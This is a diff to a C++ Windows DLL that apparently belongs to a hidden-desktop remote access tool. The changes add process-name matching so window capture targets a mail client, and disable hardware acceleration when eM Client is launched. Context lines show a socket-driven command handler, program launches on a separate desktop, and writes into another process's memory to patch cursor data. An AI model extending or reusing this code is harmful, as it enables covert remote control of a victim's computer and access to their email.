@@ -187,6 +187,26 @@ static DWORD_PTR GetModuleBaseAddress(DWORD pid, const wchar_t* modName) {
     return addr;
 }
 
+static bool IsProcessName(DWORD pid, const wstring& exeName) {
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!hProcess) return false;
+    wchar_t path[MAX_PATH] = {0};
+    DWORD size = MAX_PATH;
+    bool match = false;
+    if (QueryFullProcessImageNameW(hProcess, 0, path, &size)) {
+        wstring fullPath = path;
+        size_t slash = fullPath.find_last_of(L"\\");
+        if (slash != wstring::npos) {
+            wstring name = fullPath.substr(slash + 1);
+            if (_wcsicmp(name.c_str(), exeName.c_str()) == 0) {
+                match = true;
+            }
+        }
+    }
+    CloseHandle(hProcess);
+    return match;
+}
+
 static bool patch_cursor_info(DWORD pid) {
     HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, pid);
     if (!hProcess) return false;
@@ -948,8 +968,7 @@ static void capture_loop() {
 
                 DWORD pid = 0;
                 GetWindowThreadProcessId(hwnd, &pid);
-                DWORD targetPid = g_emClientPid.load();
-                if (targetPid != 0 && pid == targetPid) {
+                if (pid != 0 && IsProcessName(pid, L"MailClient.exe")) {
                     wchar_t title[256] = {0};
                     GetWindowTextW(hwnd, title, 256);
                     LONG style = GetWindowLongW(hwnd, GWL_STYLE);
@@ -2501,6 +2520,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
                     }
 
+                    if (wRequestedPath == L"eM Client") {
+                        SetEnvironmentVariableW(L"WPF_DISABLE_HW_ACCELERATION", L"1");
+                    }
+
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                        0, NULL, NULL, &si, &pi)) {
                         if (wRequestedPath == L"eM Client") {
@@ -2517,6 +2540,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     if (isGecko) {
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
+                    }
+
+                    if (wRequestedPath == L"eM Client") {
+                        SetEnvironmentVariableW(L"WPF_DISABLE_HW_ACCELERATION", NULL);
                     }
 
                     if (hCurrentDesktop) {
